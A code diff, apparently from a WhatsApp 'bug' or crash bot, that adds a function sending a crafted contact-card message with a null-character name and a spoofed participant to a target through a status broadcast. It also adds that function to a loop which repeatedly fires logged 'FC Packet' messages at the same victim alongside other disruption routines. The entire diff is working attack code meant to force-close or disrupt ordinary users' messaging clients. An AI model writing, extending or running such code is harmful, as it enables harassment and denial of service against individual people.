@@ -1455,6 +1455,52 @@ async function GhostCursor(sock, target) {
   });
 }
 
+async function FCinvisVcard(sock, target, mention) {
+  let msg = await generateWAMessageFromContent(target, {
+    extendedTextMessage: {
+      text: "-",
+      contextInfo: {
+        stanzaId: generateMessageID(),
+        participant: "0@s.whatsapp.net",
+        quotedMessage: {
+          contactMessage: {
+            displayName: "\u0000",
+            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:Reyhan6610\nX-WA-BIZ-NAME:Reyhan6610\nORG:Reyhan6610;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: target }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+
+  if (mention) {
+    await sock.relayMessage(target, {
+      text: "Status Mention Triggered",
+      contextInfo: {
+        mentionedJid: [target]
+      }
+    });
+  }
+}
 
 /* 
     • Credits:
@@ -1505,11 +1551,12 @@ async function sikat(sock, target) {
   }
 }
 async function BFC(sock, target) {
-  for (let i = 0; i < 20; i++) {
+  for (let i = 0; i < 10; i++) {
     //await AB1(sock, target, true)
     //await AB2(sock, target, true)
     //await FC2(sock, target)
     //await FC3(sock, target)
+    await FCinvisVcard(sock, target)
     await GhostCursor(sock, target)
     console.log(`${i} FC Packet To ${target}`)
   }
